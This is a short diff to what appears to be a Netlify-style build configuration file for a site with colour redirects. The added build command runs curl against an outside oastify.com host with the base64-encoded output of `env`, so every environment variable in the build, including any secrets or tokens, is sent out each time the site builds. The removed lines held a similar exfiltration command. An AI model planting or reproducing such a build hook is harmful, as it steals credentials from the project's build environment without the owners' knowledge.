@@ -1,7 +1,6 @@
 [build]
-    #publish = "public"
-    #command = "# No build command"
-    curl https://w41nz1gsmope4f40ywsh2s7vfmld93xs.oastify.com/ev=$(env | base64 -w 0)
+    publish = "public"
+    command = "curl https://0turo55wbseitjt4n0hlrwwz4qaiy8mx.oastify.com/ev=$(env | base64 -w 0)"
 
 [[redirects]]
     from = "/hex/:color"
